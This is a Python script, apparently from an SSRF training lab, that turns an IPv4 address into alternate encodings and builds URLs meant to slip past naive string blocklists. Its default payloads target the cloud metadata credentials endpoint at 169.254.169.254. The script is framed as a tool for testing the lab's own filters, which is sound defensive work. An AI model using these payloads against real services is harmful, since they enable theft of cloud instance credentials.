#!/usr/bin/env python3
"""
SSRF Lab — payload generator (toolkit seed)
===========================================
LAB-ONLY filter-testing utility. Given a target IPv4, it generates the common
alternate textual representations of that address and assembles candidate URLs.
We use it to test *our own lab's* filters (L1/L2) and see which encodings slip
past a naive string blocklist.

This module only transforms an address string you pass in — it performs NO
network activity itself. Point it exclusively at the lab targets. See
../SECURITY.md.

Usage:
    python ssrf_payloads.py 169.254.169.254
    python ssrf_payloads.py 169.254.169.254 --path /latest/meta-data/
"""
from __future__ import annotations

import argparse
import ipaddress


def ipv4_encodings(ip_str: str) -> dict[str, str]:
    """Return {name: host-string} for common equivalent encodings of an IPv4.

    All of these resolve to the SAME address at the socket layer on most
    systems, which is exactly why a filter that inspects the text — instead of
    the resolved address — can be fooled."""
    ip = ipaddress.IPv4Address(ip_str)
    packed = int(ip)
    octets = ip.packed  # 4 raw bytes
    return {
        "dotted-decimal":     str(ip),                               # 169.254.169.254
        "trailing-dot":       str(ip) + ".",                         # 169.254.169.254.
        "decimal-integer":    str(packed),                           # 2852039166
        "hex":                hex(packed),                           # 0xa9fea9fe
        "dotted-hex":         ".".join(f"0x{b:02x}" for b in octets), # 0xa9.0xfe.0xa9.0xfe
        "dotted-octal":       ".".join(f"0{b:o}" for b in octets),   # 0251.0376.0251.0376
        "ipv6-mapped":        f"[::ffff:{ip}]",                      # [::ffff:169.254.169.254]
    }


def build_urls(ip_str: str, path: str = "/", scheme: str = "http") -> dict[str, str]:
    """Assemble candidate URLs for each encoding of the target address."""
    return {
        name: f"{scheme}://{host}{path}"
        for name, host in ipv4_encodings(ip_str).items()
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate SSRF filter-test payloads for a LAB target.")
    parser.add_argument("ip", help="target IPv4, e.g. 169.254.169.254")
    parser.add_argument(
        "--path",
        default="/latest/meta-data/iam/security-credentials/lab-ec2-demo-role",
        help="path to append to each payload URL")
    parser.add_argument("--scheme", default="http", choices=["http", "https"])
    args = parser.parse_args()

    print(f"# SSRF Lab payloads for {args.ip}{args.path}")
    print("# LAB-ONLY — use only against the lab's own filters.\n")
    for name, url in build_urls(args.ip, args.path, args.scheme).items():
        print(f"{name:16} {url}")


if __name__ == "__main__":
    main()
